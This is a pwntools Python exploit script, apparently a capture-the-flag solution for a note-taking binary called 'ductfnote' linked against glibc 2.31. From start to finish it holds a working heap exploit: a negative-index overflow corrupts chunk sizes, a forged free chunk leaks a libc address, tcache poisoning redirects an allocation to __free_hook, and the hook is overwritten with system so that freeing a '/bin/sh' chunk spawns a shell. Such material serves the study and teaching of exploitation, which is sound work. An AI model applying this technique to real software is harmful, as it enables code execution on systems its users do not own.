#!/usr/bin/env python3
from pwn import *

exe = ELF('./ductfnote')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

io = process(exe.path)
# context.log_level = 'debug'
context.arch = 'x86_64'

def alloc(size):
    ''' it allocates 8 bytes extra anyway '''
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'Size: ', f'{size:d}')

def free():
    io.sendlineafter(b'>> ', b'4')

def edit(data):
    io.sendlineafter(b'>> ', b'3')
    io.sendline(data)

def show():
    io.sendlineafter(b'>> ', b'2')
    io.recvuntil(b'NOTE 1 ------------>\n')
    ret=io.recvuntil(b'<-------------------------------->\n', drop=True)
    return ret

#####################################################################
# Overflow using the negative index to modify the params size field #
#####################################################################
alloc(127)
buff = b'A'*128        # fill till offset goes negative
buff+= b'\x00'*84      # fill space (in tcache meta data) till we hit start of params chunk
buff+= p64(0x21)       # leave header of params chunk in tact (dont have to, but why not?)
buff+= p64(0xffffffff) # alter maxsize to be max int.
edit(buff)

#####################################################################
#           Craft a chunk outside of tcache range                   #
#####################################################################

# Allocate some more chunks after (free'ing each time)
#
# Can pick whatever sizes we want, but needs to add up to a
# size outside of tcache chunk range (>0x410) and avoid re-using
# our initial chunk size.
#
free()          # free our inital '127' sized chunk (for use again later)
alloc(0x200)    
free()
alloc(0x210)
free()
alloc(30)       # acts as guard to prevent consolidation
free()

# re-allocate the first of those three and use the overflow to mod its size
alloc(0x200)
buff = b'A'*128     # fill till offset goes negative
buff+= b'\x00'*116  # pad until we hit the size field of the chunk
buff+= p64(0x531)   # new chunk size (completely overlaps next chunk)
edit(buff)
# now free it to create a non-tcache sized free chunk (with libc pointers)
free()

#####################################################################
#              Leak pointer from free'd 0x530 chunk                 #
#####################################################################

# We use our initial '127' chunk again over an overflow. But this time
# the target is the size field in the data of our chunk (changing the 0x7F)
# to something larger.
alloc(127)             # get our initial '127' chunk again
buff = b'A'*128        # fill till offset goes negative
buff+= b'\x00'*84      # fill space (in tcache meta data) till we hit start of params chunk
buff+= p64(0x21)       # leave header in tact
buff+= p64(0xffffffff) # leave max size modified
buff+= p64(0)+p64(0)   # pad the rest of that 0x20 chunk
buff+= p64(0x111)      # keep our chunk size in tact
buff+= p32(0x120)      # modify the size field of our datanote_t struct
edit(buff)

# Now 'show the data'
data = show()
# extract just the addr and calculate the libc base from it
addr = u64(data[268:276])
info(f'leaked libc addr: 0x{addr:x}')
libc.address = addr - 0x1ebbe0
info(f'libc base: 0x{libc.address:x}')

#####################################################################
#      Overwirte an existing tcache pointer with &__free_hook       #
#####################################################################

# Free our '127' chunk (so we can get it back later)
free()

# Now allocate a chunk and free into the tcache (to set the count for
# that tcache size to one).
alloc(0x3f8)
free()

# Now get our first chunk back
alloc(127)
# Now do the overflow again, but this time we want to mess with the pointer
# for the 0x3f8 chunk we just free'd in the tcache meta data
buff = b'A'*128
buff+= b'B'*68
buff+= p64(libc.symbols.__free_hook-8) # aim 8 bytes back (because of size field)
edit(buff)
# free the '127' chunk once more (so we can get it back later)
free()

# now try to alloc the __freehook back to us as a chunk
alloc(0x3f8)
edit(b'P'*4 + p64(libc.symbols.system)) # overwrite (accoutning for 4 bytes of pad)

#####################################################################
#       Create a chunk containing '/bin/sh' we can free             #
#####################################################################

alloc(127)              # use '127' chunk again
buff = b'A'*128         # fill till offset goes negative
buff+= b'B'*124         # pad till we reach chunk data 
buff+= b'/bin/sh\x00'   # place '/bin/sh' string
edit(buff)

#####################################################################
#                    Pop a shell and win                            #
#####################################################################

free()
io.interactive()